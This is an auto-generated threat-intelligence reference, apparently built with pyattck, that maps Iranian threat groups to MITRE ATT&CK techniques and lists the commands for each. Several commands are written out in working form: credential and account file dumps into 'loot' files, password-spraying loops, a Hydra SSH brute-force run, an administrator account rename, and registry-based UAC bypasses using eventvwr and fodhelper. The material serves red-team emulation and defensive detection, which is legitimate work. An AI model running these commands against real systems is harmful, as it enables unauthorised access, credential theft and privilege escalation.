# Overview

The following content is generated using a preview release of Swimlane's [pyattck](https://github.com/swimlane/pyattck).  

This snippet of data is scoped to the following actor groups:

* APT33
* APT34
* APT39
* Charming Kitten
* CopyKittens
* Group5
* Leafminer
* Magic Hound
* MuddyWater
* OilRig

# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Account Discovery

## Technique Description

```
Adversaries may attempt to get a listing of local system or domain accounts. 

### Windows

Example commands that can acquire this information are <code>net user</code>, <code>net group <groupname></code>, and <code>net localgroup <groupname></code> using the [Net](https://attack.mitre.org/software/S0039) utility or through use of [dsquery](https://attack.mitre.org/software/S0105). If adversaries attempt to identify the primary user, currently logged in user, or set of users that commonly uses a system, [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) may apply.

### Mac

On Mac, groups can be enumerated through the <code>groups</code> and <code>id</code> commands. In mac specifically, <code>dscl . list /Groups</code> and <code>dscacheutil -q group</code> can also be used to enumerate groups and users.

### Linux

On Linux, local users can be enumerated through the use of the <code>/etc/passwd</code> file which is world readable. In mac, this same file is only used in single-user mode in addition to the <code>/etc/master.passwd</code> file.

Also, groups can be enumerated through the <code>groups</code> and <code>id</code> commands.

### Office 365 and Azure AD

With authenticated access there are several tools that can be used to find accounts. The <code>Get-MsolRoleMember</code> PowerShell cmdlet can be used to obtain account names given a role or permissions group.(Citation: Microsoft msolrolemember)(Citation: GitHub Raindance)

Azure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated access to a domain. The command <code>az ad user list</code> will list all users within a domain.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018) 

The <code>Get-GlobalAddressList</code> PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.(Citation: Microsoft getglobaladdresslist)(Citation: Black Hills Attacking Exchange MailSniper, 2016)
```

## Technique Commands

```
net user [username] [/domain]
shell net user [username] [/domain]
post/windows/gather/enum_ad_users
auxiliary/scanner/smb/smb_enumusers
dsquery group "ou=Domain Admins,dc=domain,dc=com"
dsquery user "dc=domain,dc=com"
dsquery * OU="Domain Admins",DC=domain,DC=com -scope base -attr SAMAccountName userPrincipalName Description
dsquery * -filter "(&(objectCategory=contact)(objectCategory=person)(mail=*)(objectClass=user))" -Attr samAccountName mail -Limit 0
dsquery * -filter "(&(objectCategory=group)(name=*Admin*))" -Attr name description members
shell dsquery group "out=Domain Admins",dc=domain,dc=com"
shell dsquery user "dc=domain,dc=com"
shell dsquery * OU="Domain Admins",dc=domain,dc=com -scope base -attr SAMAccountName userPrincipleName Description
shell dsquery * -filter "(&(objectCategory=contact)(objectCategory=person)(mail=*)(objectClass=user))" -Attr samAccountName mail -Limit 0
shell dsquery * -filter "(&(objectCategory=group)(name=*Admin*))" -Attr name description members
cat /etc/passwd > ~/loot.txt
cat /etc/sudoers > ~/loot.txt
grep 'x:0:' /etc/passwd > ~/loot.txt
username=$(echo $HOME | awk -F'/' '{print $3}') && lsof -u $username
lastlog > ~/loot.txt
groups
id
dscl . list /Groups
dscl . list /Users
dscl . list /Users | grep -v '_'
dscacheutil -q group
dscacheutil -q user
net user
net user /domain
dir c:\Users\
cmdkey.exe /list
net localgroup "Users"
net localgroup
net user
net user /domain
get-localuser
get-localgroupmember -group Users
cmdkey.exe /list
ls C:/Users
get-childitem C:\Users\
dir C:\Users\
get-aduser -filter *
get-localgroup
net localgroup
query user
query user
Net.exe localgroup "administrators"
Net.exe group "domain admins" /domain
Net.exe user * /domain
wmic.exe useraccount get /ALL
wmic.exe useraccount list
wmic.exe qfe get description,installedOn /format:csv
wmic.exe process get caption,executablepath,commandline
wmic.exe service get name,displayname,pathname,startmode
wmic.exe share list
wmic.exe /node:"192.168.0.1" service where (caption like "%sql server (%")
wmic.exe get-wmiobject -class "win32_share" -namespace "root\CIMV2" -computer "targetname"
nltest.exe
powershell/management/get_domain_sid
powershell/management/get_domain_sid
powershell/management/sid_to_user
powershell/management/sid_to_user
powershell/management/user_to_sid
powershell/management/user_to_sid
powershell/situational_awareness/network/get_spn
powershell/situational_awareness/network/get_spn
powershell/situational_awareness/network/powerview/find_foreign_group
powershell/situational_awareness/network/powerview/find_foreign_group
powershell/situational_awareness/network/powerview/find_foreign_user
powershell/situational_awareness/network/powerview/find_foreign_user
powershell/situational_awareness/network/powerview/find_gpo_computer_admin
powershell/situational_awareness/network/powerview/find_gpo_computer_admin
powershell/situational_awareness/network/powerview/find_gpo_location
powershell/situational_awareness/network/powerview/find_gpo_location
powershell/situational_awareness/network/powerview/find_localadmin_access
powershell/situational_awareness/network/powerview/find_localadmin_access
powershell/situational_awareness/network/powerview/find_managed_security_group
powershell/situational_awareness/network/powerview/find_managed_security_group
powershell/situational_awareness/network/powerview/get_gpo_computer
powershell/situational_awareness/network/powerview/get_gpo_computer
powershell/situational_awareness/network/powerview/get_group
powershell/situational_awareness/network/powerview/get_group
powershell/situational_awareness/network/powerview/get_group_member
powershell/situational_awareness/network/powerview/get_group_member
powershell/situational_awareness/network/powerview/get_localgroup
powershell/situational_awareness/network/powerview/get_localgroup
powershell/situational_awareness/network/powerview/get_loggedon
powershell/situational_awareness/network/powerview/get_loggedon
powershell/situational_awareness/network/powerview/get_ou
powershell/situational_awareness/network/powerview/get_ou
powershell/situational_awareness/network/powerview/get_user
powershell/situational_awareness/network/powerview/get_user
powershell/situational_awareness/network/powerview/user_hunter
powershell/situational_awareness/network/powerview/user_hunter
python/situational_awareness/network/active_directory/dscl_get_groupmembers
python/situational_awareness/network/active_directory/dscl_get_groupmembers
python/situational_awareness/network/active_directory/dscl_get_groups
python/situational_awareness/network/active_directory/dscl_get_groups
python/situational_awareness/network/active_directory/dscl_get_users
python/situational_awareness/network/active_directory/dscl_get_users
python/situational_awareness/network/active_directory/get_groupmembers
python/situational_awareness/network/active_directory/get_groupmembers
python/situational_awareness/network/active_directory/get_groupmemberships
python/situational_awareness/network/active_directory/get_groupmemberships
python/situational_awareness/network/active_directory/get_groups
python/situational_awareness/network/active_directory/get_groups
python/situational_awareness/network/active_directory/get_ous
python/situational_awareness/network/active_directory/get_ous
python/situational_awareness/network/active_directory/get_userinformation
python/situational_awareness/network/active_directory/get_userinformation
python/situational_awareness/network/active_directory/get_users
python/situational_awareness/network/active_directory/get_users
```



# Actor: Magic Hound

## Actor Description

```
[Magic Hound](https://attack.mitre.org/groups/G0059) is an Iranian-sponsored threat group operating primarily in the Middle East that dates back as early as 2014. The group behind the campaign has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: FireEye APT35 2018)
```

## Actor Aliases

```
Magic Hound
Rocket Kitten
Operation Saffron Rose
Ajax Security Team
Operation Woolen-Goldfish
Newscaster
Cobalt Gypsy
APT35
```

## Technique Name: Account Manipulation

## Technique Description

```
Account manipulation may aid adversaries in maintaining access to credentials and certain permission levels within an environment. Manipulation could consist of modifying permissions, modifying credentials, adding or changing permission groups, modifying account settings, or modifying how authentication is performed. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to subvert password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.

### Exchange Email Account Takeover

The Add-MailboxPermission PowerShell cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.(Citation: Microsoft - Add-MailboxPermission) This command can be run, given adequate permissions, to further access granted to certain user accounts. This may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can assign more access rights to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules so the messages evade spam/phishing detection mechanisms.(Citation: Bienstock, D. - Defending O365 - 2019)

### Azure AD

In Azure, an adversary can set a second password for Service Principals, facilitating persistence.(Citation: Blue Cloud of Death)

### AWS

AWS policies allow trust between accounts by simply identifying the account name. It is then up to the trusted account to only allow the correct roles to have access.(Citation: Summit Route Advanced AWS policy auditing)
```

## Technique Commands

```
$x = Get-Random -Minimum 2 -Maximum 9999
$y = Get-Random -Minimum 2 -Maximum 9999
$z = Get-Random -Minimum 2 -Maximum 9999
$w = Get-Random -Minimum 2 -Maximum 9999
Write-Host HaHaHa_$x$y$z$w

$hostname = (Get-CIMInstance CIM_ComputerSystem).Name

$fmm = Get-CimInstance -ClassName win32_group -Filter "name = 'Administrators'" | Get-CimAssociatedInstance -Association win32_groupuser | Select Name

foreach($member in $fmm) {
    if($member -like "*Administrator*") {
        Rename-LocalUser -Name $member.Name -NewName "HaHaHa_$x$y$z$w"
        Write-Host "Successfully Renamed Administrator Account on" $hostname
        }
    }
powershell/management/honeyhash
powershell/management/honeyhash
powershell/situational_awareness/network/powerview/set_ad_object
powershell/situational_awareness/network/powerview/set_ad_object
Dos
C: \ Windows \ system32> net user test321 Test.321 / add
The command completed successfully.
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Automated Collection

## Technique Description

```
Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of [Scripting](https://attack.mitre.org/techniques/T1064) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. This functionality could also be built into remote access tools. 

This technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Remote File Copy](https://attack.mitre.org/techniques/T1105) to identify and move files.
```

## Technique Commands

```
dir c: /b /s .docx | findstr /e .docx
for /R c: %f in (*.docx) do copy %f c:\temp\
Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination c:\temp}
Get-Service > $env:TEMP\T1119_1.txt
Get-ChildItem Env: > $env:TEMP\T1119_2.txt
Get-Process > $env:TEMP\T1119_3.txt
sc query type=service > %TEMP%\T1119_1.txt
doskey /history > %TEMP%\T1119_2.txt
wmic process list > %TEMP%\T1119_3.txt
tree C:\AtomicRedTeam\atomics > %TEMP%\T1119_4.txt
cmd.exe dir c: /b /s .docx | findstr /e .docx
```



# Actor: Leafminer

## Actor Description

```
[Leafminer](https://attack.mitre.org/groups/G0077) is an Iranian threat group that has targeted government organizations and business entities in the Middle East since at least early 2017. (Citation: Symantec Leafminer July 2018)
```

## Actor Aliases

```
Leafminer
Raspite
```

## Technique Name: Brute Force

## Technique Description

```
Adversaries may use brute force techniques to attempt access to accounts when passwords are unknown or when password hashes are obtained.

[Credential Dumping](https://attack.mitre.org/techniques/T1003) is used to obtain password hashes, this may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1075) is not an option. Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network. (Citation: Wikipedia Password cracking)

Adversaries may attempt to brute force logins without knowledge of passwords or hashes during an operation either with zero knowledge or by attempting a list of known or possible passwords. This is a riskier option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)

A related technique called password spraying uses one password (e.g. 'Password01'), or a small list of passwords, that matches the complexity policy of the domain and may be a commonly used password. Logins are attempted with that password and many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)

Typically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:

* SSH (22/TCP)
* Telnet (23/TCP)
* FTP (21/TCP)
* NetBIOS / SMB / Samba (139/TCP & 445/TCP)
* LDAP (389/TCP)
* Kerberos (88/TCP)
* RDP / Terminal Services (3389/TCP)
* HTTP/HTTP Management Services (80/TCP & 443/TCP)
* MSSQL (1433/TCP)
* Oracle (1521/TCP)
* MySQL (3306/TCP)
* VNC (5900/TCP)

In addition to management services, adversaries may "target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols," as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)


In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows "logon failure" event ID 4625.
```

## Technique Commands

```
net user /domain > DomainUsers.txt
echo "Password1" >> #{input_file_passwords}
echo "1q2w3e4r" >> #{input_file_passwords}
echo "Password!" >> #{input_file_passwords}
@FOR /F %n in (DomainUsers.txt) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL
net user /domain > DomainUsers.txt
echo "Password1" >> #{input_file_passwords}
echo "1q2w3e4r" >> #{input_file_passwords}
echo "Password!" >> #{input_file_passwords}
@FOR /F %n in (DomainUsers.txt) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:YOUR_COMPANY\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL
net user /domain > #{input_file_users}
echo "Password1" >> #{input_file_passwords}
echo "1q2w3e4r" >> #{input_file_passwords}
echo "Password!" >> #{input_file_passwords}
@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use \\COMPANYDC1\IPC$ /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\COMPANYDC1\IPC$ > NUL
net user /domain > #{input_file_users}
echo "Password1" >> passwords.txt
echo "1q2w3e4r" >> passwords.txt
echo "Password!" >> passwords.txt
@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (passwords.txt) DO @net use \\COMPANYDC1\IPC$ /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\COMPANYDC1\IPC$ > NUL
powershell/recon/get_sql_server_login_default_pw
powershell/recon/get_sql_server_login_default_pw
powershell/recon/http_login
powershell/recon/http_login
powershell/situational_awareness/network/smbautobrute
powershell/situational_awareness/network/smbautobrute
powershell/situational_awareness/network/smbscanner
powershell/situational_awareness/network/smbscanner
Shell
root @ icbc: / hacker / mima # hydra -l root -P passwd.txt ssh: //192.168.159.132 -V
Hydra v9.0 (c) 2019 by van Hauser / THC - Please do not use in military or secret service organizations, or for illegal purposes.
auth.log
Log
Failed password for root from 192.168.159.129 port 43728 ssh2
audit.log
Log
type = USER_AUTH msg = audit (1572163129.581: 316): pid = 2165 uid = 0 auid = 4294967295 ses = 4294967295 msg = 'op = PAM: authentication acct = "root" exe = "/ usr / sbin / sshd" hostname = 192.168 .159.129 addr = 192.168.159.129 terminal = ssh res = failed '
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Brute Force

## Technique Description

```
Adversaries may use brute force techniques to attempt access to accounts when passwords are unknown or when password hashes are obtained.

[Credential Dumping](https://attack.mitre.org/techniques/T1003) is used to obtain password hashes, this may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1075) is not an option. Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network. (Citation: Wikipedia Password cracking)

Adversaries may attempt to brute force logins without knowledge of passwords or hashes during an operation either with zero knowledge or by attempting a list of known or possible passwords. This is a riskier option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)

A related technique called password spraying uses one password (e.g. 'Password01'), or a small list of passwords, that matches the complexity policy of the domain and may be a commonly used password. Logins are attempted with that password and many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)

Typically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:

* SSH (22/TCP)
* Telnet (23/TCP)
* FTP (21/TCP)
* NetBIOS / SMB / Samba (139/TCP & 445/TCP)
* LDAP (389/TCP)
* Kerberos (88/TCP)
* RDP / Terminal Services (3389/TCP)
* HTTP/HTTP Management Services (80/TCP & 443/TCP)
* MSSQL (1433/TCP)
* Oracle (1521/TCP)
* MySQL (3306/TCP)
* VNC (5900/TCP)

In addition to management services, adversaries may "target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols," as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)


In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows "logon failure" event ID 4625.
```

## Technique Commands

```
net user /domain > DomainUsers.txt
echo "Password1" >> #{input_file_passwords}
echo "1q2w3e4r" >> #{input_file_passwords}
echo "Password!" >> #{input_file_passwords}
@FOR /F %n in (DomainUsers.txt) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL
net user /domain > DomainUsers.txt
echo "Password1" >> #{input_file_passwords}
echo "1q2w3e4r" >> #{input_file_passwords}
echo "Password!" >> #{input_file_passwords}
@FOR /F %n in (DomainUsers.txt) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:YOUR_COMPANY\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL
net user /domain > #{input_file_users}
echo "Password1" >> #{input_file_passwords}
echo "1q2w3e4r" >> #{input_file_passwords}
echo "Password!" >> #{input_file_passwords}
@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use \\COMPANYDC1\IPC$ /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\COMPANYDC1\IPC$ > NUL
net user /domain > #{input_file_users}
echo "Password1" >> passwords.txt
echo "1q2w3e4r" >> passwords.txt
echo "Password!" >> passwords.txt
@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (passwords.txt) DO @net use \\COMPANYDC1\IPC$ /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\COMPANYDC1\IPC$ > NUL
powershell/recon/get_sql_server_login_default_pw
powershell/recon/get_sql_server_login_default_pw
powershell/recon/http_login
powershell/recon/http_login
powershell/situational_awareness/network/smbautobrute
powershell/situational_awareness/network/smbautobrute
powershell/situational_awareness/network/smbscanner
powershell/situational_awareness/network/smbscanner
Shell
root @ icbc: / hacker / mima # hydra -l root -P passwd.txt ssh: //192.168.159.132 -V
Hydra v9.0 (c) 2019 by van Hauser / THC - Please do not use in military or secret service organizations, or for illegal purposes.
auth.log
Log
Failed password for root from 192.168.159.129 port 43728 ssh2
audit.log
Log
type = USER_AUTH msg = audit (1572163129.581: 316): pid = 2165 uid = 0 auid = 4294967295 ses = 4294967295 msg = 'op = PAM: authentication acct = "root" exe = "/ usr / sbin / sshd" hostname = 192.168 .159.129 addr = 192.168.159.129 terminal = ssh res = failed '
```



# Actor: APT33

## Actor Description

```
[APT33](https://attack.mitre.org/groups/G0064) is a suspected Iranian threat group that has carried out operations since at least 2013. The group has targeted organizations across multiple industries in the United States, Saudi Arabia, and South Korea, with a particular interest in the aviation and energy sectors. (Citation: FireEye APT33 Sept 2017) (Citation: FireEye APT33 Webinar Sept 2017)
```

## Actor Aliases

```
APT33
Elfin
```

## Technique Name: Brute Force

## Technique Description

```
Adversaries may use brute force techniques to attempt access to accounts when passwords are unknown or when password hashes are obtained.

[Credential Dumping](https://attack.mitre.org/techniques/T1003) is used to obtain password hashes, this may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1075) is not an option. Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network. (Citation: Wikipedia Password cracking)

Adversaries may attempt to brute force logins without knowledge of passwords or hashes during an operation either with zero knowledge or by attempting a list of known or possible passwords. This is a riskier option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)

A related technique called password spraying uses one password (e.g. 'Password01'), or a small list of passwords, that matches the complexity policy of the domain and may be a commonly used password. Logins are attempted with that password and many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)

Typically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:

* SSH (22/TCP)
* Telnet (23/TCP)
* FTP (21/TCP)
* NetBIOS / SMB / Samba (139/TCP & 445/TCP)
* LDAP (389/TCP)
* Kerberos (88/TCP)
* RDP / Terminal Services (3389/TCP)
* HTTP/HTTP Management Services (80/TCP & 443/TCP)
* MSSQL (1433/TCP)
* Oracle (1521/TCP)
* MySQL (3306/TCP)
* VNC (5900/TCP)

In addition to management services, adversaries may "target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols," as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)


In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows "logon failure" event ID 4625.
```

## Technique Commands

```
net user /domain > DomainUsers.txt
echo "Password1" >> #{input_file_passwords}
echo "1q2w3e4r" >> #{input_file_passwords}
echo "Password!" >> #{input_file_passwords}
@FOR /F %n in (DomainUsers.txt) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL
net user /domain > DomainUsers.txt
echo "Password1" >> #{input_file_passwords}
echo "1q2w3e4r" >> #{input_file_passwords}
echo "Password!" >> #{input_file_passwords}
@FOR /F %n in (DomainUsers.txt) DO @FOR /F %p in (#{input_file_passwords}) DO @net use #{remote_host} /user:YOUR_COMPANY\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL
net user /domain > #{input_file_users}
echo "Password1" >> #{input_file_passwords}
echo "1q2w3e4r" >> #{input_file_passwords}
echo "Password!" >> #{input_file_passwords}
@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (#{input_file_passwords}) DO @net use \\COMPANYDC1\IPC$ /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\COMPANYDC1\IPC$ > NUL
net user /domain > #{input_file_users}
echo "Password1" >> passwords.txt
echo "1q2w3e4r" >> passwords.txt
echo "Password!" >> passwords.txt
@FOR /F %n in (#{input_file_users}) DO @FOR /F %p in (passwords.txt) DO @net use \\COMPANYDC1\IPC$ /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\COMPANYDC1\IPC$ > NUL
powershell/recon/get_sql_server_login_default_pw
powershell/recon/get_sql_server_login_default_pw
powershell/recon/http_login
powershell/recon/http_login
powershell/situational_awareness/network/smbautobrute
powershell/situational_awareness/network/smbautobrute
powershell/situational_awareness/network/smbscanner
powershell/situational_awareness/network/smbscanner
Shell
root @ icbc: / hacker / mima # hydra -l root -P passwd.txt ssh: //192.168.159.132 -V
Hydra v9.0 (c) 2019 by van Hauser / THC - Please do not use in military or secret service organizations, or for illegal purposes.
auth.log
Log
Failed password for root from 192.168.159.129 port 43728 ssh2
audit.log
Log
type = USER_AUTH msg = audit (1572163129.581: 316): pid = 2165 uid = 0 auid = 4294967295 ses = 4294967295 msg = 'op = PAM: authentication acct = "root" exe = "/ usr / sbin / sshd" hostname = 192.168 .159.129 addr = 192.168.159.129 terminal = ssh res = failed '
```



# Actor: MuddyWater

## Actor Description

```
[MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)
```

## Actor Aliases

```
MuddyWater
Seedworm
TEMP.Zagros
```

## Technique Name: Bypass User Account Control

## Technique Description

```
Windows User Account Control (UAC) allows a program to elevate its privileges to perform a task under administrator-level permissions by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. (Citation: TechNet How UAC Works)

If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs are allowed to elevate privileges or execute some elevated COM objects without prompting the user through the UAC notification box. (Citation: TechNet Inside UAC) (Citation: MSDN COM Elevation) An example of this is use of rundll32.exe to load a specifically crafted DLL which loads an auto-elevated COM object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user. (Citation: Davidson Windows) Adversaries can use these techniques to elevate privileges to administrator if the target process is unprotected.

Many methods have been discovered to bypass UAC. The Github readme page for UACMe contains an extensive list of methods (Citation: Github UACMe) that have been discovered and implemented within UACMe, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:

* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script. (Citation: enigma0x3 Fileless UAC Bypass) (Citation: Fortinet Fareit)

Another bypass is possible through some Lateral Movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on lateral systems and default to high integrity. (Citation: SANS UAC Bypass)
```

## Technique Commands

```
uacbypass
One of the following:
exploit/windows/local/bypassuac
exploit/windows/local/bypassuac_injection
exploit/windows/local/bypassuac_vbs
reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f
cmd.exe /c eventvwr.msc
New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe" -Force
Start-Process "C:\Windows\System32\eventvwr.msc"
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "C:\Windows\System32\cmd.exe" /f
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute"
fodhelper.exe
New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"
New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe" -Force
Start-Process "C:\Windows\System32\ComputerDefaults.exe"
mkdir "\\?\C:\Windows \System32\"
copy "C:\Windows\System32\cmd.exe" "\\?\C:\Windows \System32\mmc.exe"
mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"
eventvwr.exe
HKEY_USERS\*\mscfile\shell\open\command
eventvwr.exe
mshta.exe
verclsid.exe
winword.exe
verclsid.exe
*.exe reg query
HKLM\Software\Microsoft\Windows\CurrentVersion\App Paths
Software\Classes\mscfile\shell\open\command|mscfile\shell\open\command
Software\Classes\mscfile\shell\open\command|mscfile\shell\open\command
\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe|\Software\Classes\exefile\shell\runas\command\isolatedCommand
